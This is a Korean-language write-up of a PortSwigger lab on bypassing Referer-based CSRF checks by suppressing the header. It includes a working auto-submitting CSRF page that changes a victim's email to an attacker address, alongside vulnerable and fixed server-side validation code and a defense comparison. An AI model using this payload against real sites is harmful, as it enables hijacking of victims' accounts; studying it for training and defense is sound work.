# Lab: CSRF where Referer validation depends on header being present

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — Referer 헤더 기반 방어 / 헤더 존재 여부에 따른 검증 생략
- **링크**: https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present

## 목표

서버가 `Referer` 헤더가 **존재할 때만** 검증하고, 없으면 그냥 통과시키는 취약점을 이용한다. 공격 페이지에 `no-referrer` 정책을 설정해 Referer 헤더를 제거하면 검증을 우회하여 이메일을 변경한다.

## 003 랩과의 유사성

```
[003 랩 — CSRF 토큰 존재 여부에 따른 검증]
  서버 로직:
    if 'csrf' in request.POST:
        validate(request.POST['csrf'])   ← 있을 때만 검증
    process()  ← 없으면 그냥 통과

  우회: csrf 파라미터 자체를 요청에서 제거

[011 랩 — Referer 헤더 존재 여부에 따른 검증]
  서버 로직:
    if 'Referer' in request.headers:
        validate(request.headers['Referer'])  ← 있을 때만 검증
    process()  ← 없으면 그냥 통과

  우회: Referer 헤더 자체를 요청에서 제거

패턴 동일:
  "값이 있으면 검증, 없으면 통과" → 값/헤더를 제거하면 우회
```

## Referer 헤더란

```
HTTP 요청 헤더로, 현재 요청을 보낸 페이지의 URL 을 담음

정상 흐름:
  example.com/page → 링크 클릭 → target.com/action
  요청 헤더: Referer: https://example.com/page

CSRF 방어 목적 사용:
  서버: Referer 가 자신의 도메인인지 확인
  Referer: https://evil.com → 외부 → 거부
  Referer: https://target.com → 자신 → 허용
  Referer 없음 → ? ← 이번 랩의 취약점
```

## Referer 헤더 제거 방법

### 1. `<meta>` referrer 정책 (이번 랩에서 사용)

```html
<head>
  <meta name="referrer" content="no-referrer">
</head>
```

```
효과:
  이 페이지에서 발생하는 모든 요청에 Referer 헤더 미포함
  브라우저가 자동으로 Referer 를 제거함

동작:
  공격자 페이지에 위 메타 태그 추가
  → 폼 제출 시 Referer: https://evil.com 이 전송되지 않음
  → 서버: Referer 없음 → 검증 생략 → 통과
```

### 2. Referrer-Policy HTTP 응답 헤더

```
서버 응답 헤더로도 설정 가능 (공격자 서버에서 자신의 페이지에 적용):
  Referrer-Policy: no-referrer
```

### 3. fetch API 옵션

```javascript
fetch('/action', {
    method: 'POST',
    referrerPolicy: 'no-referrer'
});
```

## 공격 방법

### 최종 페이로드

```html
<html>
  <head>
    <!-- Referer 헤더 제거 지시 -->
    <meta name="referrer" content="no-referrer">
  </head>
  <body>
    <form action="https://VULNERABLE.com/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### 실행 흐름

```
1. 피해자가 exploit 페이지 방문

2. 브라우저:
   <meta name="referrer" content="no-referrer"> 를 읽고
   이 페이지에서 나가는 요청에 Referer 를 포함하지 않기로 설정

3. 폼 자동 제출:
   POST /my-account/change-email
   Cookie: session=VICTIM_SESSION   ← 자동 첨부
   (Referer 헤더 없음)              ← 메타 태그로 제거됨

4. 서버 검증:
   if 'Referer' in headers:         → False (헤더 없음)
       validate(Referer)            → 실행 안 됨
   process()                        → 이메일 변경 처리

5. 피해자 이메일 변경 완료
```

## CSRF 토큰 없이 Referer 에만 의존하는 위험성

```
[Referer 기반 방어의 한계]

1. 헤더 제거 (이번 랩):
   no-referrer 정책 → 검증 생략

2. Referer 값 조작:
   취약한 검증: Referer.includes('target.com')
   우회: https://evil.com/target.com/... → includes 통과

3. 서드파티 도구/환경:
   일부 프록시, 보안 소프트웨어가 Referer 를 자동 제거
   → 정상 사용자도 Referer 없이 요청 가능
   → 서버가 Referer 없는 요청을 막으면 정상 사용자도 차단됨
   → 결국 "없으면 통과" 정책으로 후퇴 → 취약점

4. HTTPS → HTTP 전환:
   HTTPS 페이지에서 HTTP 엔드포인트로 요청 시
   브라우저가 Referer 자동 제거 (보안상)

→ Referer 는 보조 수단이어야 함. 단독 사용 시 우회 가능
```

## 이전 랩들과의 비교

| 랩 | 방어 수단 | 우회 방법 | 공통 패턴 |
|----|---------|---------|---------|
| 003 | CSRF 토큰 | 토큰 파라미터 제거 | 값 없으면 통과 |
| 011 (이번) | Referer 헤더 | Referer 헤더 제거 | 값 없으면 통과 |

## 핵심 정리

- 서버가 `Referer` 헤더가 **있을 때만** 검증하고 없으면 통과시키면, 공격자는 헤더를 제거해 우회한다.
- `<meta name="referrer" content="no-referrer">` 로 브라우저가 Referer 헤더를 전송하지 않도록 지시할 수 있다.
- Referer 기반 방어는 보조 수단에 불과하며, CSRF 토큰 없이 단독 사용 시 여러 방법으로 우회된다.
- **방어**:
  - Referer 없는 요청을 명시적으로 거부 (단, 정상 사용자 차단 부작용 존재)
  - Referer 검증과 CSRF 토큰을 함께 사용
  - 근본적으로 CSRF 토큰 또는 SameSite 쿠키 속성이 더 신뢰할 수 있는 방어

## 배운 점 및 추가 학습

### 1. Referrer-Policy 정책 값 정리

```
no-referrer:
  모든 요청에 Referer 미포함
  이번 랩 공격에 사용

no-referrer-when-downgrade (브라우저 기본값):
  HTTPS → HTTP: Referer 제거
  HTTPS → HTTPS: Referer 전송

same-origin:
  동일 출처 요청에만 Referer 전송
  크로스 사이트 요청에는 미포함

strict-origin:
  동일 출처 + HTTPS 유지 시에만 Referer 전송

strict-origin-when-cross-origin:
  동일 출처: 전체 URL 전송
  크로스 사이트: 출처(origin)만 전송 (경로 제외)

unsafe-url:
  항상 전체 URL 전송 (가장 많은 정보 노출)
```

### 2. Referer 검증의 올바른 구현

```python
# 취약한 구현 (이번 랩):
def change_email(request):
    referer = request.headers.get('Referer')
    if referer:                          # 있을 때만 검증
        if 'target.com' not in referer:
            return 403
    process(request)                     # 없으면 그냥 통과

# 개선 1: Referer 없으면 거부
def change_email(request):
    referer = request.headers.get('Referer')
    if not referer:                      # 없으면 거부
        return 403
    if not referer.startswith('https://target.com/'):
        return 403
    process(request)

# 개선 2: Origin 헤더 검증 (더 신뢰할 수 있음)
def change_email(request):
    origin = request.headers.get('Origin')
    if origin != 'https://target.com':
        return 403
    process(request)

# 가장 좋은 방법: CSRF 토큰 사용
def change_email(request):
    if request.POST.get('csrf') != session['csrf_token']:
        return 403
    process(request)
```

### 3. Referer vs Origin 헤더 비교

```
Referer 헤더:
  전체 URL 포함: https://example.com/path?query=value
  브라우저/정책에 따라 제거될 수 있음
  no-referrer 정책으로 쉽게 제거 가능
  → 신뢰도 낮음

Origin 헤더:
  출처만 포함: https://example.com (경로/쿼리 없음)
  POST, PUT, DELETE 등 unsafe method 에서 항상 전송
  no-referrer 정책으로도 제거 안 됨
  → 신뢰도 높음

CSRF 방어 관점:
  Origin 헤더 검증이 Referer 검증보다 더 안정적
  단, GET 요청에는 Origin 헤더 없음 → GET CSRF에는 미적용
```

### 4. CSRF 방어 수단 신뢰도 비교

```
높음 ───────────────────────────────────────── 낮음

[CSRF 토큰 (세션 연결)]     가장 신뢰할 수 있는 방어
[SameSite=Strict (명시)]    강력, 단 브라우저 지원 의존
[SameSite=Lax (명시)]       대부분 방어, 일부 우회 가능
[Origin 헤더 검증]           안정적 보조 수단
[Referer 헤더 검증]          우회 가능, 보조 수단에만 적합
[SameSite 미설정]            2분 예외 등 취약 (010 랩)
[Referer 있을 때만 검증]     이번 랩 — 매우 취약
```
